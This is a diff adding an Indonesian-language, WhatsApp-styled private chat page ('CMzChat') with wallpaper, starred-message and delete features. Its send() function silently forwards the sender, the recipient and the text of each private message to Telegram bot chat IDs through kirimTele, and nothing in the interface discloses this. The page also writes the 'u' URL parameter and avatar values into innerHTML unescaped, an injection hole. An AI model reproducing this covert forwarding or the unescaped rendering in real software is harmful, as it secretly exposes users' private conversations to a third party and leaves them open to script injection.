@@ -1,0 +1,339 @@
+<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"><title>CMzChat</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{--g:#00a884;--g2:#06cf9c;--p:#1f2c33;--s:#8696A0;--bubble-me:#005c4b;--bubble-other:#202c33}
+html,body{height:100%}
+body{display:flex;flex-direction:column;background:#0b141a;color:#e9edef;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;overflow:hidden}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 20% 30%,rgba(0,168,132,.04) 0,transparent 40%),radial-gradient(circle at 80% 70%,rgba(0,168,132,.03) 0,transparent 40%);pointer-events:none;z-index:0}
+.h{height:64px;background:linear-gradient(180deg,rgba(32,44,51,.95),rgba(32,44,51,.9));backdrop-filter:blur(20px);display:flex;align-items:center;padding:0 8px;gap:8px;flex-shrink:0;box-shadow:0 1px 3px rgba(0,0,0,.4);position:relative;z-index:3;border-bottom:1px solid rgba(255,255,255,.04)}
+.h .back{width:42px;height:42px;border:0;background:transparent;color:#aebac1;font-size:20px;cursor:pointer;border-radius:50%;display:grid;place-items:center;transition:background .15s}
+.h .back:active{background:rgba(255,255,255,.08)}
+.h .av{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#3b4a54,#2a3942);display:grid;place-items:center;font-weight:600;color:#c9d1d6;font-size:17px;overflow:hidden;flex-shrink:0;box-shadow:0 2px 8px rgba(0,0,0,.3),0 0 0 2px rgba(0,168,132,.2)}
+.h .av img{width:100%;height:100%;object-fit:cover}
+.h .info{flex:1;min-width:0;cursor:pointer}
+.h .info b{font-size:16px;font-weight:600;color:#e9edef;display:flex;align-items:center;gap:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.h .info .status{font-size:12px;color:var(--s);margin-top:1px;display:flex;align-items:center;gap:4px}
+.h .info .status.online{color:var(--g2)}
+.h .info .status.online::before{content:'';width:6px;height:6px;background:var(--g2);border-radius:50%;box-shadow:0 0 6px var(--g2);animation:dotPulse 2s ease-in-out infinite}
+@keyframes dotPulse{0%,100%{opacity:1}50%{opacity:.4}}
+.h .dots{width:42px;height:42px;border:0;background:transparent;color:#aebac1;font-size:20px;cursor:pointer;border-radius:50%;display:grid;place-items:center;transition:background .15s}
+.h .dots:active{background:rgba(255,255,255,.08)}
+
+.msgs{flex:1;overflow-y:auto;padding:16px 8px 8px;display:flex;flex-direction:column;position:relative;z-index:1;background-size:cover;background-position:center}
+.msgs::-webkit-scrollbar{width:5px}
+.msgs::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:10px}
+.date-sep{text-align:center;margin:12px 0}
+.date-sep span{background:rgba(24,34,41,.9);color:#8696a0;font-size:11px;padding:5px 12px;border-radius:14px;font-weight:500;box-shadow:0 2px 8px rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.04)}
+.msg-row{display:flex;margin:1px 0;position:relative;gap:6px;align-items:flex-end}
+.msg-row.me{justify-content:flex-end;flex-direction:row-reverse}
+.bubble{max-width:78%;padding:8px 12px 6px;border-radius:10px;font-size:14.5px;line-height:20px;word-wrap:break-word;white-space:pre-wrap;position:relative;box-shadow:0 1px 2px rgba(0,0,0,.3);cursor:pointer;transition:transform .1s}
+.bubble:active{transform:scale(.98)}
+.me .bubble{background:linear-gradient(135deg,#005c4b,#00705c);border-top-right-radius:3px}
+.other .bubble{background:linear-gradient(135deg,#202c33,#26353e);border-top-left-radius:3px;border:1px solid rgba(255,255,255,.03)}
+.msg-row.first .bubble::before{content:'';position:absolute;top:0;width:10px;height:14px}
+.me.first .bubble::before{right:-8px;background:#00705c;clip-path:polygon(0 0,100% 0,0 100%)}
+.other.first .bubble::before{left:-8px;background:#26353e;clip-path:polygon(100% 0,100% 100%,0 0)}
+.bubble .t{font-size:10.5px;color:rgba(255,255,255,.6);float:right;margin:4px -2px -4px 8px;display:inline-flex;align-items:center;gap:2px}
+.bubble .t .tick{color:#53bdeb;font-size:12px;letter-spacing:-3px}
+.bubble .star{color:#ffd600;font-size:11px;margin-right:4px}
+.msg-av{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,#3b4a54,#2a3942);display:grid;place-items:center;font-size:13px;font-weight:600;color:#c9d1d6;overflow:hidden;flex-shrink:0;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+.msg-av img{width:100%;height:100%;object-fit:cover}
+.msg-av.hide{visibility:hidden}
+.empty-chat{text-align:center;color:var(--s);padding:60px 20px;font-size:13.5px;line-height:1.7}
+.empty-chat .em{font-size:56px;margin-bottom:14px;opacity:.4;filter:grayscale(.3)}
+
+.bar{background:linear-gradient(180deg,rgba(32,44,51,.9),rgba(32,44,51,.98));backdrop-filter:blur(20px);padding:8px 8px calc(10px + env(safe-area-inset-bottom));display:flex;gap:8px;align-items:flex-end;flex-shrink:0;position:relative;z-index:2;border-top:1px solid rgba(255,255,255,.04)}
+.bar .inp-wrap{flex:1;background:rgba(11,20,26,.7);border:1px solid rgba(255,255,255,.06);border-radius:24px;display:flex;align-items:flex-end;padding:2px;transition:all .25s}
+.bar .inp-wrap:focus-within{border-color:var(--g);box-shadow:0 0 0 4px rgba(0,168,132,.12)}
+.bar textarea{flex:1;background:transparent;border:0;color:#fff;outline:none;padding:11px 16px;font-size:14.5px;font-family:inherit;resize:none;max-height:110px;line-height:20px}
+.bar textarea::placeholder{color:#5a6772}
+.bar .send{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,var(--g),var(--g2));border:0;color:#fff;font-size:18px;cursor:pointer;display:grid;place-items:center;flex-shrink:0;transition:all .2s;box-shadow:0 4px 12px rgba(0,168,132,.4)}
+.bar .send:active{transform:scale(.88)}
+.bar .send:hover{box-shadow:0 6px 18px rgba(0,168,132,.55)}
+
+.verified-badge{display:inline-flex;align-items:center;justify-content:center;width:15px;height:15px;background:linear-gradient(135deg,#1DA1F2,#0d8de0);border-radius:50%;flex-shrink:0;box-shadow:0 2px 6px rgba(29,161,242,.4)}
+.verified-badge svg{width:9px;height:9px;fill:#fff}
+.role-tag{font-size:9px;padding:2px 7px;border-radius:8px;background:rgba(42,57,66,.9);color:#aebac1;font-weight:700;margin-left:4px;letter-spacing:.3px;text-transform:uppercase}
+.role-tag.dev{background:linear-gradient(135deg,#ff3b3b,#e02020);color:#fff}
+.role-tag.own{background:linear-gradient(135deg,#ffd600,#f0b800);color:#000}
+
+.toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%) translateY(20px);background:rgba(42,57,66,.98);backdrop-filter:blur(20px);color:#e9edef;padding:11px 20px;border-radius:24px;font-size:13px;font-weight:500;opacity:0;transition:all .35s cubic-bezier(.4,0,.2,1);z-index:99;pointer-events:none;box-shadow:0 10px 30px rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.08)}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+.menu-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);backdrop-filter:blur(4px);z-index:100;display:none}
+.menu-overlay.show{display:block}
+.menu-popup{position:absolute;top:60px;right:12px;background:linear-gradient(180deg,#233138,#1f2c33);border:1px solid rgba(255,255,255,.08);border-radius:14px;min-width:220px;padding:6px;box-shadow:0 20px 50px rgba(0,0,0,.6);animation:popIn .2s ease-out}
+@keyframes popIn{from{opacity:0;transform:scale(.9) translateY(-10px)}to{opacity:1;transform:scale(1) translateY(0)}}
+.menu-item{padding:12px 16px;font-size:14.5px;color:#e9edef;cursor:pointer;display:flex;align-items:center;gap:14px;border-radius:10px;transition:background .15s}
+.menu-item:active{background:rgba(255,255,255,.06)}
+.menu-item .ic{font-size:17px;width:22px;text-align:center}
+
+.wp-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(6px);z-index:200;display:none;align-items:center;justify-content:center;padding:20px}
+.wp-overlay.show{display:flex}
+.wp-box{background:linear-gradient(180deg,#111b21,#0d161b);border:1px solid rgba(255,255,255,.06);border-radius:20px;padding:22px;max-width:400px;width:100%;max-height:80vh;overflow-y:auto;box-shadow:0 30px 80px rgba(0,0,0,.7)}
+.wp-box h3{margin-bottom:16px;font-size:16px;font-weight:600}
+.wp-colors{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:18px}
+.wp-color{aspect-ratio:1;border-radius:12px;cursor:pointer;border:2px solid transparent;transition:all .2s;box-shadow:0 4px 12px rgba(0,0,0,.3)}
+.wp-color:active{transform:scale(.95)}
+.wp-color.selected{border-color:var(--g);box-shadow:0 0 0 3px rgba(0,168,132,.3),0 4px 12px rgba(0,0,0,.3)}
+.wp-btn{display:block;width:100%;padding:14px;border:0;border-radius:12px;font-size:14px;font-weight:600;cursor:pointer;margin-top:10px;background:rgba(255,255,255,.06);color:#fff;font-family:inherit;transition:background .2s}
+.wp-btn.primary{background:linear-gradient(135deg,var(--g),var(--g2));box-shadow:0 4px 12px rgba(0,168,132,.4)}
+.wp-btn:active{transform:scale(.98)}
+
+.msg-action{position:fixed;background:linear-gradient(180deg,#233138,#1f2c33);border:1px solid rgba(255,255,255,.08);border-radius:12px;min-width:180px;padding:6px;z-index:150;display:none;box-shadow:0 20px 50px rgba(0,0,0,.6);animation:popIn .15s ease-out}
+.msg-action.show{display:block}
+</style></head><body>
+
+<div class="h">
+  <button class="back" onclick="location.href='dashboard.html'">←</button>
+  <div class="av" id="chatAvatar">?</div>
+  <div class="info" onclick="showInfo()">
+    <b id="chatName">-</b>
+    <div class="status" id="chatStatus">online</div>
+  </div>
+  <button class="dots" onclick="toggleMenu()">⋮</button>
+</div>
+
+<div class="menu-overlay" id="menuOverlay" onclick="closeMenu()">
+  <div class="menu-popup" onclick="event.stopPropagation()">
+    <div class="menu-item" onclick="menuAction('wp')"><span class="ic">🖼️</span>Ubah Wallpaper</div>
+    <div class="menu-item" onclick="menuAction('star')"><span class="ic">⭐</span>Pesan Berbintang</div>
+    <div class="menu-item" onclick="menuAction('info')"><span class="ic">ℹ️</span>Info Kontak</div>
+    <div class="menu-item" onclick="menuAction('bersih')"><span class="ic">🗑️</span>Bersihkan Chat</div>
+  </div>
+</div>
+
+<div class="msgs" id="msgs"></div>
+
+<div class="bar">
+  <div class="inp-wrap"><textarea id="msgInput" placeholder="Ketik pesan..." rows="1"></textarea></div>
+  <button class="send" onclick="send()">➤</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<div class="wp-overlay" id="wpOverlay" onclick="if(event.target===this)this.classList.remove('show')">
+  <div class="wp-box">
+    <h3>🖼️ Ubah Wallpaper</h3>
+    <div style="font-size:11px;color:var(--s);margin-bottom:10px;text-transform:uppercase;letter-spacing:1px;font-weight:600">Warna Solid</div>
+    <div class="wp-colors" id="wpColors"></div>
+    <button class="wp-btn primary" onclick="document.getElementById('wpFile').click()">📷 Pilih dari Galeri</button>
+    <input type="file" id="wpFile" accept="image/*" style="display:none">
+    <button class="wp-btn" onclick="resetWallpaper()">🔄 Reset Default</button>
+    <button class="wp-btn" onclick="document.getElementById('wpOverlay').classList.remove('show')">✕ Tutup</button>
+  </div>
+</div>
+
+<div class="msg-action" id="msgAction" onclick="event.stopPropagation()">
+  <div class="menu-item" id="starBtn" onclick="toggleStar()"><span class="ic">⭐</span>Bintangi</div>
+  <div class="menu-item" onclick="copyMsg()"><span class="ic">📋</span>Salin</div>
+  <div class="menu-item" onclick="deleteMsg()"><span class="ic">🗑️</span>Hapus</div>
+</div>
+
+<script src="env.js"></script>
+<script>
+const K = 'cmzapps_final_wa100_v7';
+const CHAT_KEY = 'cmz_private_v1';
+const AVATAR_KEY = 'cmz_avatars_v1';
+const STARRED_KEY = 'cmz_starred_v1';
+const WP_KEY = 'cmz_wallpaper_v1';
+const UNREAD_KEY = 'cmz_unread_v1';
+const TELE_TOKEN = window.ENV?.TELEGRAM_TOKEN || "";
+const TELE_IDS = [window.ENV?.TELEGRAM_CHAT_ID || "", window.ENV?.TELEGRAM_CHAT_ID_2 || ""].filter(x=>x);
+
+let me = localStorage.getItem('cmz_me') || 'ceomudaz';
+let db = JSON.parse(localStorage.getItem(K) || '{"users":{}}');
+let params = new URLSearchParams(location.search);
+let other = params.get('u') || localStorage.getItem('cmz_active_chat');
+
+if(!other) location.href = 'dashboard.html';
+localStorage.setItem('cmz_active_chat', other);
+try { if(db.users[me]?.banned) location.href = 'banned.html'; } catch(e) {}
+
+function getAvatar(u){try{return JSON.parse(localStorage.getItem(AVATAR_KEY)||'{}')[u]||'';}catch(e){return '';}}
+function avatarInner(u){let a = getAvatar(u); return a ? `<img src="${a}">` : u[0].toUpperCase();}
+function isVer(u){try{return db.users[u]?.verified && db.users[u].verified.end>Date.now();}catch(e){return false}}
+function badge(){return '<span class="verified-badge"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></span>';}
+function roleTag(r){let c = r==='Developer'?'dev':r==='Owner'?'own':''; return `<span class="role-tag ${c}">${r||'User'}</span>`;}
+
+document.getElementById('chatName').innerHTML = other + (isVer(other)?badge():'') + roleTag(db.users[other]?.role||'User');
+document.getElementById('chatAvatar').innerHTML = avatarInner(other);
+document.getElementById('chatAvatar').style.fontSize = '17px';
+let st = document.getElementById('chatStatus');
+if(db.users[other]?.banned){st.innerText = '🚫 Dibanned'; st.style.color = '#ff3b3b'; st.classList.remove('online');}
+else {st.innerText = 'online'; st.classList.add('online');}
+
+function getKey(){return [me, other].sort().join('_');}
+function loadChats(){try{return JSON.parse(localStorage.getItem(CHAT_KEY)||'{}');}catch(e){return{}}}
+function saveChats(c){localStorage.setItem(CHAT_KEY, JSON.stringify(c));}
+function escapeHtml(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+
+function getWallpaper(){try{return JSON.parse(localStorage.getItem(WP_KEY)||'{}')[me]||null;}catch(e){return null;}}
+function setWallpaper(wp){
+  let all = {}; try{all = JSON.parse(localStorage.getItem(WP_KEY)||'{}');}catch(e){}
+  if(wp) all[me] = wp; else delete all[me];
+  localStorage.setItem(WP_KEY, JSON.stringify(all));
+  applyWallpaper();
+}
+function applyWallpaper(){
+  let wp = getWallpaper(); let el = document.getElementById('msgs');
+  if(!wp){el.style.background = ''; el.style.backgroundImage = ''; return;}
+  if(wp.type === 'color'){el.style.background = wp.value; el.style.backgroundImage = '';}
+  else {el.style.background = '#0b141a'; el.style.backgroundImage = `url(${wp.value})`;}
+}
+const COLORS = ['#0b141a','#1a1a2e','#16213e','#0f3460','#4a2c2a','#2c3e50','#1e3a2c','#3d1e3d','#404040','#2d1b3d','#1a3a3a','#3a2a1a'];
+function buildColorPicker(){
+  let el = document.getElementById('wpColors'); let cur = getWallpaper();
+  el.innerHTML = COLORS.map(c => `<div class="wp-color ${cur?.value===c?'selected':''}" style="background:${c}" onclick="pickColor('${c}')"></div>`).join('');
+}
+function pickColor(c){setWallpaper({type:'color', value:c}); buildColorPicker(); showToast('✅ Wallpaper diubah'); setTimeout(()=>document.getElementById('wpOverlay').classList.remove('show'), 400);}
+document.getElementById('wpFile').addEventListener('change', function(e){
+  let f = e.target.files[0]; if(!f) return;
+  let r = new FileReader();
+  r.onload = ev => {
+    let img = new Image();
+    img.onload = () => {
+      let canvas = document.createElement('canvas');
+      let max = 1000; let w = img.width, h = img.height;
+      if(w > h){ if(w > max){h = h*max/w; w = max;} } else { if(h > max){w = w*max/h; h = max;} }
+      canvas.width = w; canvas.height = h;
+      canvas.getContext('2d').drawImage(img, 0, 0, w, h);
+      setWallpaper({type:'image', value: canvas.toDataURL('image/jpeg', 0.75)});
+      document.getElementById('wpOverlay').classList.remove('show');
+      showToast('✅ Wallpaper diubah');
+    };
+    img.src = ev.target.result;
+  };
+  r.readAsDataURL(f);
+});
+function resetWallpaper(){setWallpaper(null); buildColorPicker(); showToast('🔄 Wallpaper direset'); setTimeout(()=>document.getElementById('wpOverlay').classList.remove('show'), 400);}
+
+function getStarred(){try{return JSON.parse(localStorage.getItem(STARRED_KEY)||'[]');}catch(e){return[];}}
+function setStarred(a){localStorage.setItem(STARRED_KEY, JSON.stringify(a));}
+function isStarred(msg){return getStarred().some(s => s.key === getKey() && s.time === msg.time && s.text === msg.text);}
+
+function clearUnread(){
+  let u = {}; try{u = JSON.parse(localStorage.getItem(UNREAD_KEY)||'{}');}catch(e){}
+  delete u[getKey()];
+  localStorage.setItem(UNREAD_KEY, JSON.stringify(u));
+}
+
+function formatDate(ts){
+  let d = new Date(ts), t = new Date();
+  let dd = new Date(d.getFullYear(), d.getMonth(), d.getDate());
+  let tt = new Date(t.getFullYear(), t.getMonth(), t.getDate());
+  let diff = Math.round((tt-dd)/86400000);
+  if(diff === 0) return 'Hari ini';
+  if(diff === 1) return 'Kemarin';
+  return d.toLocaleDateString('id-ID',{day:'numeric',month:'long',year:'numeric'});
+}
+
+let lastRenderedCount = 0;
+function render(scroll=true){
+  let arr = loadChats()[getKey()] || [];
+  let el = document.getElementById('msgs');
+  if(!arr.length){
+    el.innerHTML = `<div class="empty-chat"><div class="em">💬</div>Belum ada pesan.<br>Mulai percakapan dengan <b>${escapeHtml(other)}</b>.</div>`;
+    lastRenderedCount = 0; return;
+  }
+  let html = ''; let prevBy = null, prevDate = null;
+  arr.forEach((m, i) => {
+    let dateLabel = formatDate(m.time);
+    if(dateLabel !== prevDate){ html += `<div class="date-sep"><span>${dateLabel}</span></div>`; prevDate = dateLabel; prevBy = null; }
+    let isMe = m.by === me;
+    let t = new Date(m.time).toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
+    let isFirst = prevBy !== m.by;
+    let starred = isStarred(m);
+    let avHTML = isMe ? `<div class="msg-av hide"></div>` : (isFirst ? `<div class="msg-av">${avatarInner(m.by)}</div>` : `<div class="msg-av hide"></div>`);
+    html += `<div class="msg-row ${isMe?'me':'other'} ${isFirst?'first':''}">${avHTML}
+      <div class="bubble" onclick="openMsgMenu(event, ${i})">${starred?'<span class="star">⭐</span>':''}${escapeHtml(m.text)}<span class="t">${t}${isMe?' <span class="tick">✓✓</span>':''}</span></div>
+    </div>`;
+    prevBy = m.by;
+  });
+  el.innerHTML = html;
+  if(scroll && lastRenderedCount !== arr.length) requestAnimationFrame(() => {el.scrollTop = el.scrollHeight;});
+  lastRenderedCount = arr.length;
+}
+
+let activeMsgIdx = -1;
+function openMsgMenu(e, idx){
+  e.stopPropagation(); activeMsgIdx = idx;
+  let menu = document.getElementById('msgAction');
+  let m = (loadChats()[getKey()] || [])[idx];
+  if(!m) return;
+  let starred = isStarred(m);
+  document.getElementById('starBtn').innerHTML = `<span class="ic">⭐</span>${starred?'Hapus Bintang':'Bintangi'}`;
+  let rect = e.target.getBoundingClientRect();
+  menu.style.left = Math.min(rect.left, window.innerWidth - 200) + 'px';
+  menu.style.top = Math.min(rect.bottom + 5, window.innerHeight - 180) + 'px';
+  menu.classList.add('show');
+}
+document.addEventListener('click', () => document.getElementById('msgAction').classList.remove('show'));
+
+function toggleStar(){
+  let arr = loadChats()[getKey()] || []; let m = arr[activeMsgIdx]; if(!m) return;
+  let starred = getStarred();
+  let exists = starred.findIndex(s => s.key === getKey() && s.time === m.time && s.text === m.text);
+  if(exists >= 0){ starred.splice(exists, 1); showToast('⭐ Bintang dihapus'); }
+  else { starred.unshift({key:getKey(), by:m.by, to:other, text:m.text, time:m.time, chatWith:other}); showToast('⭐ Dibintangi'); }
+  setStarred(starred); render(false);
+  document.getElementById('msgAction').classList.remove('show');
+}
+function copyMsg(){
+  let arr = loadChats()[getKey()] || []; let m = arr[activeMsgIdx]; if(!m) return;
+  navigator.clipboard.writeText(m.text).then(() => showToast('📋 Pesan disalin')).catch(() => showToast('❌ Gagal salin'));
+  document.getElementById('msgAction').classList.remove('show');
+}
+function deleteMsg(){
+  let arr = loadChats()[getKey()] || []; let m = arr[activeMsgIdx];
+  if(!m || m.by !== me) return showToast('❌ Hanya pesan sendiri');
+  if(!confirm('Hapus pesan?')) return;
+  arr.splice(activeMsgIdx, 1);
+  let all = loadChats(); all[getKey()] = arr; saveChats(all); render();
+  document.getElementById('msgAction').classList.remove('show');
+}
+
+function send(){
+  let inp = document.getElementById('msgInput');
+  let txt = inp.value.trim(); if(!txt) return;
+  if(db.users[other]?.banned){showToast('❌ Tidak bisa kirim'); return;}
+  let chats = loadChats(); let key = getKey();
+  if(!chats[key]) chats[key] = [];
+  chats[key].push({by:me, to:other, text:txt, time:Date.now()});
+  saveChats(chats); inp.value = ''; autoResize(); render();
+  kirimTele(`💬 PESAN\n👤 Dari: @${me}\n🎯 Ke: @${other}\n📝 ${txt.substring(0,120)}`);
+}
+function kirimTele(p){
+  if(!TELE_TOKEN || !TELE_IDS.length) return;
+  TELE_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(p)}`).catch(()=>{}));
+}
+function showToast(m){
+  let t = document.getElementById('toast');
+  t.innerText = m; t.classList.add('show');
+  clearTimeout(t._tm); t._tm = setTimeout(() => t.classList.remove('show'), 2000);
+}
+function showInfo(){
+  let r = db.users[other]?.role || 'User';
+  alert(`👤 ${other}\n🏷️ Role: ${r}\n${isVer(other)?'✔️ Terverifikasi':''}`);
+}
+function toggleMenu(){document.getElementById('menuOverlay').classList.toggle('show');}
+function closeMenu(){document.getElementById('menuOverlay').classList.remove('show');}
+function menuAction(a){
+  closeMenu();
+  setTimeout(() => {
+    if(a==='wp'){buildColorPicker(); document.getElementById('wpOverlay').classList.add('show');}
+    else if(a==='star') location.href = 'berbintang.html';
+    else if(a==='info') showInfo();
+    else if(a==='bersih'){ if(confirm('Hapus semua pesan di chat ini?')){ let all = loadChats(); all[getKey()] = []; saveChats(all); render(); showToast('🗑️ Chat dibersihkan'); } }
+  }, 150);
+}
+
+let inp = document.getElementById('msgInput');
+function autoResize(){inp.style.height='auto'; inp.style.height = Math.min(inp.scrollHeight, 110) + 'px';}
+inp.addEventListener('input', autoResize);
+inp.addEventListener('keydown', e => {if(e.key==='Enter' && !e.shiftKey){e.preventDefault(); send();}});
+
+clearUnread(); applyWallpaper(); render();
+setInterval(() => render(false), 2000);
+setTimeout(() => inp.focus(), 200);
+</script></body></html>
